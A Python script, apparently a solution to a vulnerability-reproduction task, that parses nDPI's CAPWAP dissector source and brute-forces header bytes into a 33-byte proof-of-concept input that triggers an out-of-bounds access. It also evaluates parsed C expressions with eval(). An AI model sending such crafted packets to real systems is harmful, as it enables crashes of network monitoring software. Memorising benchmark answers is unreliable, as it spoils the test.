import os
import re
import tarfile
from typing import Dict, List, Optional, Set, Tuple


def _read_text_from_tar(src_path: str, max_file_size: int = 3_000_000) -> List[Tuple[str, str]]:
    out: List[Tuple[str, str]] = []
    with tarfile.open(src_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            if m.size <= 0 or m.size > max_file_size:
                continue
            name = m.name
            if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".h") or name.endswith(".hpp")):
                continue
            f = tf.extractfile(m)
            if f is None:
                continue
            try:
                data = f.read()
            except Exception:
                continue
            try:
                text = data.decode("utf-8", "ignore")
            except Exception:
                continue
            out.append((name, text))
    return out


def _read_text_from_dir(src_dir: str, max_file_size: int = 3_000_000) -> List[Tuple[str, str]]:
    out: List[Tuple[str, str]] = []
    for root, _, files in os.walk(src_dir):
        for fn in files:
            if not (fn.endswith(".c") or fn.endswith(".cc") or fn.endswith(".cpp") or fn.endswith(".h") or fn.endswith(".hpp")):
                continue
            p = os.path.join(root, fn)
            try:
                st = os.stat(p)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > max_file_size:
                continue
            try:
                with open(p, "rb") as f:
                    data = f.read()
                text = data.decode("utf-8", "ignore")
            except Exception:
                continue
            rel = os.path.relpath(p, src_dir)
            out.append((rel, text))
    return out


def _extract_c_function(text: str, func_name: str) -> Optional[str]:
    idx = text.find(func_name)
    if idx < 0:
        return None

    n = len(text)
    i = idx

    # Find first '{' after func name (skip prototypes).
    brace_pos = -1
    state = 0  # 0 normal, 1 linecomment, 2 blockcomment, 3 string, 4 char
    escape = False
    while i < n:
        ch = text[i]
        if state == 0:
            if ch == '"' and not escape:
                state = 3
            elif ch == "'" and not escape:
                state = 4
            elif ch == "/" and i + 1 < n and text[i + 1] == "/":
                state = 1
                i += 1
            elif ch == "/" and i + 1 < n and text[i + 1] == "*":
                state = 2
                i += 1
            elif ch == "{":
                brace_pos = i
                break
        elif state == 1:
            if ch == "\n":
                state = 0
        elif state == 2:
            if ch == "*" and i + 1 < n and text[i + 1] == "/":
                state = 0
                i += 1
        elif state == 3:
            if ch == "\\" and not escape:
                escape = True
            else:
                if ch == '"' and not escape:
                    state = 0
                escape = False
        elif state == 4:
            if ch == "\\" and not escape:
                escape = True
            else:
                if ch == "'" and not escape:
                    state = 0
                escape = False
        i += 1

    if brace_pos < 0:
        return None

    # Match braces
    i = brace_pos
    depth = 0
    state = 0
    escape = False
    while i < n:
        ch = text[i]
        if state == 0:
            if ch == '"' and not escape:
                state = 3
            elif ch == "'" and not escape:
                state = 4
            elif ch == "/" and i + 1 < n and text[i + 1] == "/":
                state = 1
                i += 1
            elif ch == "/" and i + 1 < n and text[i + 1] == "*":
                state = 2
                i += 1
            elif ch == "{":
                depth += 1
            elif ch == "}":
                depth -= 1
                if depth == 0:
                    return text[brace_pos : i + 1]
        elif state == 1:
            if ch == "\n":
                state = 0
        elif state == 2:
            if ch == "*" and i + 1 < n and text[i + 1] == "/":
                state = 0
                i += 1
        elif state == 3:
            if ch == "\\" and not escape:
                escape = True
            else:
                if ch == '"' and not escape:
                    state = 0
                escape = False
        elif state == 4:
            if ch == "\\" and not escape:
                escape = True
            else:
                if ch == "'" and not escape:
                    state = 0
                escape = False
        i += 1
    return None


def _strip_c_comments(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    state = 0  # 0 normal, 1 linecomment, 2 blockcomment, 3 string, 4 char
    escape = False
    while i < n:
        ch = s[i]
        if state == 0:
            if ch == "/" and i + 1 < n and s[i + 1] == "/":
                state = 1
                i += 2
                continue
            if ch == "/" and i + 1 < n and s[i + 1] == "*":
                state = 2
                i += 2
                continue
            if ch == '"' and not escape:
                state = 3
                out.append(ch)
                i += 1
                continue
            if ch == "'" and not escape:
                state = 4
                out.append(ch)
                i += 1
                continue
            out.append(ch)
            i += 1
        elif state == 1:
            if ch == "\n":
                out.append("\n")
                state = 0
            i += 1
        elif state == 2:
            if ch == "*" and i + 1 < n and s[i + 1] == "/":
                state = 0
                i += 2
            else:
                i += 1
        elif state == 3:
            out.append(ch)
            if ch == "\\" and not escape:
                escape = True
            else:
                if ch == '"' and not escape:
                    state = 0
                escape = False
            i += 1
        elif state == 4:
            out.append(ch)
            if ch == "\\" and not escape:
                escape = True
            else:
                if ch == "'" and not escape:
                    state = 0
                escape = False
            i += 1
    return "".join(out)


def _normalize_c_expr(expr: str) -> str:
    expr = expr.strip()
    expr = re.sub(r"\b(packet\s*->\s*)?payload_packet_len\b", "size", expr)
    expr = re.sub(r"\b(packet\s*->\s*)?payload\s*\[", "b[", expr)
    expr = re.sub(r"\bpayload\s*\[", "b[", expr)

    # Remove common casts
    expr = re.sub(r"\(\s*(?:u_?int|uint|int|short|long|char|size_t)\d*_t\s*\)", "", expr)
    expr = re.sub(r"\(\s*(?:u_?int|uint|int|short|long|char)\s*\)", "", expr)

    # Remove numeric suffixes
    expr = re.sub(r"(\b0x[0-9A-Fa-f]+|\b\d+)\s*(?:ULL|UL|LL|U|L)\b", r"\1", expr)

    # Functions/macros
    expr = re.sub(r"\bget_u_int16_t\s*\(\s*b\s*,", "get_u_int16_t(b,", expr)
    expr = re.sub(r"\bget_u_int32_t\s*\(\s*b\s*,", "get_u_int32_t(b,", expr)
    expr = re.sub(r"\bget_u_int16_t\s*\(\s*payload\s*,", "get_u_int16_t(b,", expr)
    expr = re.sub(r"\bget_u_int32_t\s*\(\s*payload\s*,", "get_u_int32_t(b,", expr)

    # Logical operators
    expr = expr.replace("&&", " and ").replace("||", " or ")
    expr = re.sub(r"!(?!=)", " not ", expr)

    # NULL / true / false
    expr = re.sub(r"\bNULL\b", "0", expr)
    expr = re.sub(r"\btrue\b", "True", expr, flags=re.IGNORECASE)
    expr = re.sub(r"\bfalse\b", "False", expr, flags=re.IGNORECASE)
    return expr.strip()


def _get_u_int16_t(b: bytes, off: int) -> int:
    if off < 0 or off + 1 >= len(b):
        return 0
    return (b[off] << 8) | b[off + 1]


def _get_u_int32_t(b: bytes, off: int) -> int:
    if off < 0 or off + 3 >= len(b):
        return 0
    return (b[off] << 24) | (b[off + 1] << 16) | (b[off + 2] << 8) | b[off + 3]


def _safe_eval_expr(expr: str, b: bytes, size: int, extra: Optional[Dict[str, int]] = None) -> Optional[int]:
    env: Dict[str, object] = {
        "b": b,
        "size": size,
        "get_u_int16_t": _get_u_int16_t,
        "get_u_int32_t": _get_u_int32_t,
        "ntohs": lambda x: x,
        "ntohl": lambda x: x,
        "htons": lambda x: x,
        "htonl": lambda x: x,
        "True": True,
        "False": False,
    }
    if extra:
        env.update(extra)
    try:
        v = eval(expr, {"__builtins__": {}}, env)
    except Exception:
        return None
    try:
        return int(v)
    except Exception:
        return None


def _safe_eval_bool(expr: str, b: bytes, size: int, extra: Optional[Dict[str, int]] = None) -> Optional[bool]:
    env: Dict[str, object] = {
        "b": b,
        "size": size,
        "get_u_int16_t": _get_u_int16_t,
        "get_u_int32_t": _get_u_int32_t,
        "ntohs": lambda x: x,
        "ntohl": lambda x: x,
        "htons": lambda x: x,
        "htonl": lambda x: x,
        "True": True,
        "False": False,
    }
    if extra:
        env.update(extra)
    try:
        v = eval(expr, {"__builtins__": {}}, env)
    except Exception:
        return None
    try:
        return bool(v)
    except Exception:
        return None


def _collect_if_return_conditions(func_body: str) -> List[str]:
    s = _strip_c_comments(func_body)
    lines = s.splitlines()
    conds: List[str] = []
    i = 0
    while i < len(lines):
        line = lines[i].strip()
        if "if" not in line or not line.startswith("if"):
            i += 1
            continue

        # Gather condition between matching parentheses starting after 'if'
        pos = line.find("if")
        p0 = line.find("(", pos)
        if p0 < 0:
            i += 1
            continue

        cond_buf = []
        j = i
        k = p0
        depth = 0
        done = False
        while j < len(lines) and not done:
            l = lines[j]
            start = k if j == i else 0
            for t in range(start, len(l)):
                ch = l[t]
                if ch == "(":
                    depth += 1
                    if depth == 1:
                        continue
                elif ch == ")":
                    depth -= 1
                    if depth == 0:
                        done = True
                        break
                if depth >= 1:
                    cond_buf.append(ch)
            j += 1
            k = 0

        if not done:
            i += 1
            continue

        cond_str = "".join(cond_buf).strip()
        # Determine whether body is immediate return within next couple lines
        tail_text = ""
        # Remaining of current line after end of condition
        # Find in original line segment after matching ')'
        # We'll just check next 3 non-empty lines for a bare return
        tlines = []
        for jj in range(i, min(len(lines), i + 5)):
            tl = lines[jj].strip()
            if tl:
                tlines.append(tl)
        joined = " ".join(tlines)
        if re.search(r"\breturn\b", joined) is None:
            i += 1
            continue

        # Keep only if it seems like a guard return (not in else, not complex)
        # We accept it but later might fail to eval and be dropped.
        conds.append(cond_str)
        i += 1
    return conds


def _collect_min_len(func_body: str) -> int:
    s = _strip_c_comments(func_body)
    min_len = 0
    for m in re.finditer(r"\bpayload_packet_len\b\s*<\s*(\d+)", s):
        try:
            v = int(m.group(1))
            if v > min_len:
                min_len = v
        except Exception:
            pass
    for m in re.finditer(r"\bpayload_packet_len\b\s*<=\s*(\d+)", s):
        try:
            v = int(m.group(1)) + 1
            if v > min_len:
                min_len = v
        except Exception:
            pass
    return min_len


def _find_assignment_exprs(func_body: str) -> List[Tuple[str, str]]:
    s = _strip_c_comments(func_body)
    out: List[Tuple[str, str]] = []
    for m in re.finditer(r"\b([A-Za-z_]\w*)\b\s*=\s*([^;]+);", s):
        var = m.group(1)
        rhs = m.group(2).strip()
        out.append((var, rhs))
    return out


def _find_best_hlen_expr(assigns: List[Tuple[str, str]]) -> Optional[str]:
    for var, rhs in assigns:
        if var.lower().endswith("hlen") or var.lower() == "hlen" or "hlen" in var.lower():
            if "payload" in rhs or "packet->payload" in rhs:
                return rhs
    return None


def _find_best_header_len_expr(func_body: str, assigns: List[Tuple[str, str]]) -> Optional[Tuple[str, str]]:
    s = _strip_c_comments(func_body)
    used_vars: Set[str] = set(re.findall(r"\bpayload\s*\[\s*([A-Za-z_]\w*)\b", s))
    used_vars |= set(re.findall(r"\bpacket\s*->\s*payload\s*\[\s*([A-Za-z_]\w*)\b", s))

    candidates: List[Tuple[str, str]] = []
    for var, rhs in assigns:
        lv = var.lower()
        if var not in used_vars and ("capwap" in lv or "hdr" in lv or "header" in lv or "off" in lv or "offset" in lv or "len" in lv):
            continue
        if ("payload" in rhs or "packet->payload" in rhs) and (("* 4" in rhs) or ("*4" in rhs) or ("<< 2" in rhs) or ("<<2" in rhs)):
            candidates.append((var, rhs))
        elif ("hlen" in rhs.lower()) and (("* 4" in rhs) or ("*4" in rhs) or ("<< 2" in rhs) or ("<<2" in rhs)):
            candidates.append((var, rhs))

    # prefer capwap_header_len
    for var, rhs in candidates:
        if "capwap" in var.lower() and "len" in var.lower():
            return var, rhs
    if candidates:
        return candidates[0]
    return None


def _indices_in_expr(expr: str) -> List[int]:
    idxs = set()
    for m in re.finditer(r"\bb\s*\[\s*(\d+)\s*\]", expr):
        try:
            idxs.add(int(m.group(1)))
        except Exception:
            pass
    return sorted(idxs)


class Solution:
    def solve(self, src_path: str) -> bytes:
        files: List[Tuple[str, str]] = []
        if os.path.isdir(src_path):
            files = _read_text_from_dir(src_path)
        else:
            try:
                files = _read_text_from_tar(src_path)
            except Exception:
                if os.path.isdir(os.path.dirname(src_path)):
                    files = _read_text_from_dir(os.path.dirname(src_path))

        func_text = None
        for _, txt in files:
            if "ndpi_search_setup_capwap" in txt:
                func_text = _extract_c_function(txt, "ndpi_search_setup_capwap")
                if func_text:
                    break

        target_size = 33
        poc_default = bytearray(target_size)
        poc_default[-1] = 0x00

        if not func_text:
            # Reasonable CAPWAP-looking bytes with HLEN-ish knobs
            poc_default[0] = 0x00
            poc_default[1] = 0x08
            return bytes(poc_default)

        min_len = _collect_min_len(func_text)
        if min_len > target_size:
            target_size = min_len if min_len < 4096 else 4096
            poc_default = bytearray(target_size)
            poc_default[-1] = 0

        assigns = _find_assignment_exprs(func_text)
        hlen_rhs = _find_best_hlen_expr(assigns)
        hdrlen_pair = _find_best_header_len_expr(func_text, assigns)

        # Build header length computation
        hdr_len_py_expr: Optional[str] = None
        hlen_py_expr: Optional[str] = None

        if hdrlen_pair is not None:
            _, hdr_rhs = hdrlen_pair
            hdr_len_py_expr = _normalize_c_expr(hdr_rhs)
        elif hlen_rhs is not None:
            hlen_py_expr = _normalize_c_expr(hlen_rhs)

        # Collect guard conditions evaluable without unknown identifiers
        conds_raw = _collect_if_return_conditions(func_text)
        guard_exprs: List[str] = []
        for c in conds_raw:
            ce = _normalize_c_expr(c)
            # Skip conditions likely involving unavailable symbols
            if re.search(r"\b(packet|flow|ndpi|proto|tcp|udp|ip|ipv6|src|dst|memcmp|memchr|strlen|strncmp|strncasecmp)\b", ce):
                continue
            # If it still contains arrows or weird chars, skip
            if "->" in ce:
                continue
            # Only allow a conservative character set
            if re.search(r"[^A-Za-z0-9_\s\[\]\(\)\+\-\*\/%<>=!&\|\^~,:.]", ce):
                continue
            # It must reference payload length or bytes; otherwise probably irrelevant
            if "b[" not in ce and "size" not in ce:
                continue
            guard_exprs.append(ce)

        desired_hdr_len = target_size - 1

        # Determine which indices matter for header length expression
        expr_for_idxs = hdr_len_py_expr if hdr_len_py_expr is not None else hlen_py_expr
        idxs = _indices_in_expr(expr_for_idxs) if expr_for_idxs else []
        if not idxs:
            idxs = [0, 1]
        # brute over up to 2 indices
        brute_idxs = idxs[:2]
        if len(brute_idxs) == 1:
            brute_idxs = brute_idxs + [brute_idxs[0] + 1]

        def compute_hdr_len(b: bytes) -> Optional[int]:
            if hdr_len_py_expr is not None:
                return _safe_eval_expr(hdr_len_py_expr, b, len(b))
            if hlen_py_expr is not None:
                h = _safe_eval_expr(hlen_py_expr, b, len(b))
                if h is None:
                    return None
                return h * 4
            return None

        best = None

        # brute force values for two bytes
        for v0 in range(256):
            for v1 in range(256):
                b = bytearray(target_size)
                b[-1] = 0x00
                b[brute_idxs[0]] = v0
                b[brute_idxs[1]] = v1

                hdr_len = compute_hdr_len(b)
                if hdr_len is None:
                    continue
                if hdr_len != desired_hdr_len:
                    continue

                ok = True
                for ge in guard_exprs:
                    bv = _safe_eval_bool(ge, b, target_size)
                    if bv is None:
                        continue
                    if bv:
                        ok = False
                        break
                if ok:
                    best = bytes(b)
                    break
            if best is not None:
                break

        if best is not None:
            return best

        # Fallback: try a few common CAPWAP-like header encodings for HLEN=8 -> 32 bytes
        candidates = []
        # Common interpretations:
        # 1) hdr_len = (b[0] & 0x1f) << 2 => need b[0]&0x1f == 8
        candidates.append((0x08, 0x00))
        # 2) hdr_len = (b[1] & 0x1f) << 2 => need b[1]&0x1f == 8
        candidates.append((0x00, 0x08))
        # 3) hdr_len = (((b[0] & 0x07) << 2) | (b[1] >> 6)) << 2 => need ((...) == 8)
        #    choose b[0]&7 = 2, b[1]>>6 = 0
        candidates.append((0x02, 0x00))
        # 4) variant: b[1] low bits also set but top bits 0
        candidates.append((0x02, 0x08))

        for a0, a1 in candidates:
            b = bytearray(target_size)
            b[0] = a0
            b[1] = a1
            b[-1] = 0x00
            return bytes(b)

        return bytes(poc_default)